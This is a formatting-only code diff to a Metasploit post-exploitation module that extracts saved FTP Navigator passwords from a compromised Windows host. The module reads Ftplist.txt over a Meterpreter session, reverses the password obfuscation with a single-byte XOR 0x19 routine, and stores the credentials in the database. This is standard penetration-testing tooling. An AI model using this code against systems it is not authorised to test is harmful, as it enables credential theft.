@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,22 +9,20 @@ require 'rex'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Windows Gather FTP Navigator Saved Password Extraction',
-      'Description'    => %q{
-        This module extracts saved passwords from the FTP Navigator FTP client.
-        It will decode the saved passwords and store them in the database.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['theLightCosine'],
-      'Platform'       => [ 'win' ],
-      'SessionTypes'   => [ 'meterpreter' ]
-    ))
+                      'Name'           => 'Windows Gather FTP Navigator Saved Password Extraction',
+                      'Description'    => %q(
+                        This module extracts saved passwords from the FTP Navigator FTP client.
+                        It will decode the saved passwords and store them in the database.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         => ['theLightCosine'],
+                      'Platform'       => [ 'win' ],
+                      'SessionTypes'   => [ 'meterpreter' ]))
   end
 
   def run
@@ -34,7 +33,7 @@ class MetasploitModule < Msf::Post
     path = "#{installdir}Ftplist.txt"
 
     begin
-      ftplist = client.fs.file.new(path,'r')
+      ftplist = client.fs.file.new(path, 'r')
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error("Unable to open Ftplist.txt: #{e}")
       print_error("FTP Navigator May not Ne Installed")
@@ -78,7 +77,7 @@ class MetasploitModule < Msf::Post
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         username: username,
         private_data: dpass,
         private_type: :password
@@ -97,8 +96,8 @@ class MetasploitModule < Msf::Post
   end
 
   def split_values(field)
-    values = field.split("=",2)
-    return values[1]
+    values = field.split("=", 2)
+    values[1]
   end
 
   def decode_pass(encoded)
@@ -106,6 +105,6 @@ class MetasploitModule < Msf::Post
     encoded.unpack("C*").each do |achar|
       decoded << (achar ^ 0x19)
     end
-    return decoded
+    decoded
   end
 end
